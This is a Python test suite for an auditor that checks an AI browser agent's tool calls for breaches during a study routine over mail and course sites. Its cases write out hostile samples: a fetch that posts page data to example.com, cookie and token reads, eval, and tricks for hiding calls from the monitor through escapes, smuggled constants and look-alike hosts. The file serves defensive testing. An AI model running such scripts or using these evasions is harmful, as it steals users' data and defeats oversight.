"""Tests for bin/audit.py. Run: python3 -m unittest discover -s routine/tests"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

KIT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
AUDIT = os.path.join(KIT, "bin", "audit.py")
NAV = "mcp__claude-in-chrome__navigate"
JS = "mcp__claude-in-chrome__javascript_tool"
HOSTS = ["mail.google.com", "canvas.example.edu", "www.gradescope.com", "piazza.com", "discord.com"]


def snippet(name):
    with open(os.path.join(KIT, "snippets", name), encoding="utf-8") as f:
        return f.read()


class AuditCase(unittest.TestCase):
    def setUp(self):
        self.home = tempfile.mkdtemp(prefix="audit-test-")
        self.addCleanup(shutil.rmtree, self.home, ignore_errors=True)
        shutil.copytree(os.path.join(KIT, "snippets"), os.path.join(self.home, "snippets"))
        self.run_dir = os.path.join(self.home, "runs", "2026-09-26_0800")
        os.makedirs(self.run_dir)
        self.config(allowed_hosts=HOSTS, forbidden_urls=[r"mail\.google\.com/mail/u/(2|3)/"])
        self.n = 0

    def config(self, **values):
        with open(os.path.join(self.home, "config.json"), "w", encoding="utf-8") as f:
            json.dump(values, f)

    def call(self, tool, data, result="ok", error=False):
        self.n += 1
        ident = f"toolu_{self.n:04d}"
        return [
            {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": ident, "name": tool, "input": data}]}},
            {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": ident, "is_error": error, "content": result}]}},
        ]

    def audit(self, calls, source="none", role="routine", finish=True):
        lines = [{"type": "system", "subtype": "init", "model": "claude-opus-5-5", "apiKeySource": source}]
        for c in calls:
            lines += c
        if finish:
            lines.append({"type": "result", "subtype": "success", "is_error": False, "num_turns": 3,
                          "duration_ms": 120000, "result": "done", "permission_denials": []})
        stream = os.path.join(self.run_dir, f"stream-{role}.jsonl")
        with open(stream, "w", encoding="utf-8") as f:
            f.write("\n".join(json.dumps(x) for x in lines) + "\n")
        p = subprocess.run([sys.executable, AUDIT, "--stream", stream, "--role", role, "--run", self.run_dir,
                            "--home", self.home], capture_output=True, text=True)
        report = None
        path = os.path.join(self.run_dir, f"audit-{role}.json")
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                report = json.load(f)
        return p, report

    def rules(self, report, severity="breach"):
        return sorted(f["rule"] for f in report["findings"] if f["severity"] == severity)

    # ---- clean runs

    def test_clean_run_with_snippets(self):
        read = snippet("gmail-read.js").replace("'0000000000000000'", "'18c2f0a1b2c3d4e5'").replace(
            "const MESSAGE = -1;", "const MESSAGE = 0;").replace("const OFFSET = 0;", "const OFFSET = 900;")
        p, r = self.audit([
            self.call("Read", {"file_path": "sources.md"}),
            self.call("mcp__claude_ai_Gmail__search_threads", {"query": "after:2026/09/19"}),
            self.call(NAV, {"url": "https://mail.google.com/mail/u/1/#search/newer_than%3A3d", "tabId": 1}),
            self.call(JS, {"action": "javascript_exec", "tabId": 1, "text": snippet("gmail-list.js")}),
            self.call(JS, {"action": "javascript_exec", "tabId": 1, "text": read}),
            self.call(NAV, {"url": "https://canvas.example.edu/api/v1/planner/items?start_date=2026-09-19&per_page=100"}),
            self.call(JS, {"action": "javascript_exec", "tabId": 1, "text": snippet("canvas-json.js")}),
            self.call("Write", {"file_path": "runs/x/report.json", "content": "{}"}),
        ])
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["signIn"], "Claude plan")
        self.assertEqual(r["scripts"], {"canvas-json.js": 1, "gmail-list.js": 1, "gmail-read.js": 1})
        self.assertEqual(r["pages"], {"canvas.example.edu/api/v1/planner/items": 1, "mail.google.com/mail/u/1/": 1})
        self.assertEqual(r["turns"], 3)

    def test_every_snippet_is_recognised_as_itself(self):
        for name in sorted(os.listdir(os.path.join(KIT, "snippets"))):
            if not name.endswith(".js"):
                continue
            with self.subTest(name=name):
                p, r = self.audit([self.call(JS, {"text": snippet(name)})])
                self.assertEqual(r["findings"], [], name)
                self.assertEqual(r["scripts"], {name: 1})

    def test_a_wait_and_stripped_comments_keep_a_snippet_clean(self):
        body = "\n".join(l for l in snippet("gmail-list.js").splitlines() if not l.lstrip().startswith("//"))
        p, r = self.audit([self.call(JS, {"text": "await new Promise(r => setTimeout(r, 3000));\n" + body})])
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["scripts"], {"gmail-list.js": 1})

    def test_escapes_written_out_as_characters_still_match(self):
        # An agent copying a snippet may turn an escape into the character it stands for.
        with open(os.path.join(self.home, "snippets", "probe.js"), "w", encoding="utf-8") as f:
            f.write("(() => document.title.replace(/[\\u200b\\u00ad]/g, '') + fetch.name)()\n")
        p, r = self.audit([self.call(JS, {"text": "(() => document.title.replace(/[\u200b\u00ad]/g, '') + fetch.name)()"})])
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["scripts"], {"probe.js": 1})

    def test_an_escape_cannot_hide_a_call(self):
        p, r = self.audit([self.call(JS, {"text": "window['\\u0066etch']('https://example.com'); \\u0066etch('https://example.com')"})])
        self.assertEqual(p.returncode, 1)
        self.assertIn("script-network", self.rules(r))

    def test_no_snippet_uses_an_escape_an_agent_could_rewrite(self):
        for name in sorted(os.listdir(os.path.join(KIT, "snippets"))):
            if name.endswith(".js"):
                with self.subTest(name=name):
                    self.assertNotRegex(snippet(name), r"\\u[0-9a-fA-F{]|\\x[0-9a-fA-F]{2}")

    def test_changed_constants_are_allowed(self):
        text = snippet("text.js").replace("const OFFSET = 0;", "const OFFSET = 1800;").replace(
            "'main, [role=main], #main, body'", "'#content'")
        chans = snippet("discord-channel.js").replace("const CHANNELS = false;", "const CHANNELS = true;")
        item = snippet("canvas-json.js").replace("const ITEM = null;", "const ITEM = 555002;")
        p, r = self.audit([self.call(JS, {"text": text}), self.call(JS, {"text": chans}), self.call(JS, {"text": item})])
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["scripts"], {"canvas-json.js": 1, "discord-channel.js": 1, "text.js": 1})

    def test_own_reading_script_is_clean(self):
        p, r = self.audit([self.call(JS, {"text": "[...document.querySelectorAll('h2')].map(h => h.textContent.trim()).join('|')"})])
        self.assertEqual(p.returncode, 0)
        self.assertEqual(r["findings"], [])
        self.assertEqual(r["scripts"], {"own": 1})

    # ---- scripts that act

    def test_scripts_that_act_are_breaches(self):
        cases = {
            "document.querySelector('button.send').click()": "script-acts",
            "document.querySelector( 'form' ) . submit ( )": "script-acts",
            "document.querySelector('input').value = 'x'": "script-acts",
            "await fetch('https://example.com/collect', {method: 'POST', body: document.title})": "script-network",
            "new XMLHttpRequest()": "script-network",
            "document.cookie": "script-storage",
            "localStorage.getItem('token')": "script-storage",
            "document.body.innerHTML = ''": "script-changes",
            "document.querySelector('a').setAttribute('href', '#')": "script-changes",
            "location.href = 'https://example.com'": "script-leaves",
            "window.open('https://example.com')": "script-leaves",
            "eval('1+1')": "script-code",
        }
        for text, rule in cases.items():
            with self.subTest(text=text):
                p, r = self.audit([self.call(JS, {"text": text})])
                self.assertEqual(p.returncode, 1)
                self.assertIn(rule, self.rules(r))

    def test_comparisons_and_arrows_are_not_assignments(self):
        for text in ("[...document.querySelectorAll('input')].filter(i => i.value === 'a').length",
                     "[...document.querySelectorAll('input')].map(i => i.value == '' ? 0 : 1)",
                     "location.href === 'x'"):
            with self.subTest(text=text):
                p, r = self.audit([self.call(JS, {"text": text})])
                self.assertEqual(self.rules(r), [], text)

    def test_a_snippet_with_something_added_is_judged_on_the_addition(self):
        p, r = self.audit([self.call(JS, {"text": snippet("gmail-list.js") + "\nfetch('https://example.com/?d=' + document.title)"})])
        self.assertEqual(p.returncode, 1)
        self.assertIn("script-network", self.rules(r))
        self.assertEqual(r["scripts"], {"gmail-list.js+own": 1})

    def test_the_mail_reader_with_a_tampered_request_is_a_breach(self):
        text = snippet("gmail-read.js").replace("method: 'GET'", "method: 'POST'")
        p, r = self.audit([self.call(JS, {"text": text})])
        self.assertEqual(p.returncode, 1)
        self.assertIn("script-network", self.rules(r))

    def test_a_constant_cannot_carry_code(self):
        text = snippet("gmail-read.js").replace("'0000000000000000'", "'x'; fetch('https://example.com'); const Y = 'y'")
        p, r = self.audit([self.call(JS, {"text": text})])
        self.assertEqual(p.returncode, 1)
        self.assertIn("script-network", self.rules(r))

    def test_scrolling_and_hidden_text_are_warnings(self):
        p, r = self.audit([self.call(JS, {"text": "window.scrollTo(0, 9999); window['fe' + 'tch']"})])
        self.assertEqual(p.returncode, 0)
        self.assertEqual(self.rules(r, "warning"), ["script-hidden", "script-scrolls"])

    # ---- where the tab was pointed

    def visit(self, url):
        p, r = self.audit([self.call(NAV, {"url": url})])
        return p.returncode, self.rules(r)

    def test_visits(self):
        ok = [
            "https://mail.google.com/mail/u/1/#search/newer_than%3A3d",
            "https://mail.google.com/mail/u/4/#search/newer_than%3A3d/p2",
            "https://mail.google.com/mail/u/1/#search/thermodynamicsfinalexam",
            "https://mail.google.com/mail/u/1/#inbox",
            "https://canvas.example.edu/api/v1/announcements?context_codes[]=course_12345&per_page=20",
            "https://canvas.example.edu/api/v1/conversations?scope=unread&per_page=20",
            "https://canvas.example.edu/api/v1/conversations/991?auto_mark_as_read=false",
            "https://www.gradescope.com/courses/1000001",
            "https://piazza.com/class/k1a2b3c4d5e6f7",
            "https://discord.com/channels/@me/123456789012345678",
            "back",
        ]
        for url in ok:
            with self.subTest(url=url):
                self.assertEqual(self.visit(url), (0, []))
        bad = {
            "https://example.com/": "visit-host",
            "https://mail.google.com.example.com/mail/u/1/": "visit-host",
            "http://piazza.com/class/k1a2b3c4d5e6f7": "visit-scheme",
            "https://mail.google.com/mail/u/2/#inbox": "visit-forbidden",
            "https://mail.google.com/mail/u/3/#search/newer_than%3A3d": "visit-forbidden",
            "https://mail.google.com/mail/u/1/#all/18c2f0a1b2c3d4e5": "visit-marks",
            "https://mail.google.com/mail/u/1/#inbox/FMfcgzQZTpsXnRkkLbQhVwGdJxCmNqPz": "visit-marks",
            "https://mail.google.com/mail/u/1/?view=pt&search=all&permthid=thread-f%3A1": "visit-marks",
            "https://canvas.example.edu/courses/12345/discussion_topics/555001": "visit-marks",
            "https://canvas.example.edu/conversations": "visit-marks",
            "https://canvas.example.edu/api/v1/conversations/991": "visit-marks",
            "https://piazza.com/class/k1a2b3c4d5e6f7?cid=12": "visit-marks",
            "https://piazza.com/class/k1a2b3c4d5e6f7/post/12": "visit-marks",
        }
        for url, rule in bad.items():
            with self.subTest(url=url):
                code, rules = self.visit(url)
                self.assertEqual(code, 1)
                self.assertIn(rule, rules)

    def test_no_allowed_hosts_means_every_visit_is_a_breach(self):
        self.config()
        self.assertEqual(self.visit("https://piazza.com/class/x"), (1, ["visit-host"]))

    # ---- tools, refusals, billing

    def test_a_refused_call_is_a_warning_and_is_not_judged_further(self):
        p, r = self.audit([self.call("Read", {"file_path": "/etc/hostname"},
                                     result="Permission to use Read has been denied because Claude Code is running in don't ask mode.",
                                     error=True),
                           self.call(NAV, {"url": "https://example.com"}, result="Permission denied", error=True)])
        self.assertEqual(p.returncode, 0)
        self.assertEqual(self.rules(r), [])
        self.assertEqual(self.rules(r, "warning"), ["refused", "refused"])

    def test_a_tool_that_is_not_a_reading_tool_is_a_breach(self):
        p, r = self.audit([self.call("mcp__claude_ai_Gmail__send_message", {"to": "x@example.com"})])
        self.assertEqual(p.returncode, 1)
        self.assertEqual(self.rules(r), ["tool"])

    def test_extra_allowed_tools_are_expected(self):
        self.config(allowed_hosts=HOSTS, extra_allowed_tools=["mcp__claude_ai_Google_Calendar__list_events"])
        p, r = self.audit([self.call("mcp__claude_ai_Google_Calendar__list_events", {})])
        self.assertEqual(r["findings"], [])

    def test_a_run_billed_to_a_key_is_a_breach(self):
        p, r = self.audit([], source="ANTHROPIC_API_KEY")
        self.assertEqual(p.returncode, 1)
        self.assertEqual(self.rules(r), ["billing"])
        self.assertEqual(r["signIn"], "ANTHROPIC_API_KEY")

    # ---- what is kept

    def test_results_are_not_kept(self):
        p, r = self.audit([self.call("mcp__claude_ai_Gmail__get_thread", {"thread_id": "abc"},
                                     result="Dear Sam, the offer is SECRET-FIGURE dollars")])
        for name in os.listdir(self.run_dir):
            if name.startswith(("actions-", "audit-", "agent-")):
                with open(os.path.join(self.run_dir, name), encoding="utf-8") as f:
                    self.assertNotIn("SECRET-FIGURE", f.read(), name)
        with open(os.path.join(self.run_dir, "actions-routine.jsonl"), encoding="utf-8") as f:
            rows = [json.loads(l) for l in f]
        self.assertEqual([(x["tool"], x["denied"]) for x in rows], [("mcp__claude_ai_Gmail__get_thread", False)])

    def test_the_result_event_is_written_for_the_runner(self):
        self.audit([])
        with open(os.path.join(self.run_dir, "agent-routine.json"), encoding="utf-8") as f:
            self.assertEqual(json.load(f)["result"], "done")

    def test_an_agent_that_did_not_finish(self):
        p, r = self.audit([self.call("Read", {"file_path": "sources.md"})], finish=False)
        self.assertEqual(p.returncode, 0)
        self.assertFalse(r["finished"])
        with open(os.path.join(self.run_dir, "agent-routine.json"), encoding="utf-8") as f:
            self.assertTrue(json.load(f)["is_error"])

    def test_missing_or_broken_stream(self):
        p = subprocess.run([sys.executable, AUDIT, "--stream", os.path.join(self.run_dir, "none.jsonl"),
                            "--role", "routine", "--run", self.run_dir, "--home", self.home], capture_output=True, text=True)
        self.assertEqual(p.returncode, 4)
        bad = os.path.join(self.run_dir, "bad.jsonl")
        with open(bad, "w") as f:
            f.write("{not json\n")
        p = subprocess.run([sys.executable, AUDIT, "--stream", bad, "--role", "routine", "--run", self.run_dir,
                            "--home", self.home], capture_output=True, text=True)
        self.assertEqual(p.returncode, 4)


if __name__ == "__main__":
    unittest.main()
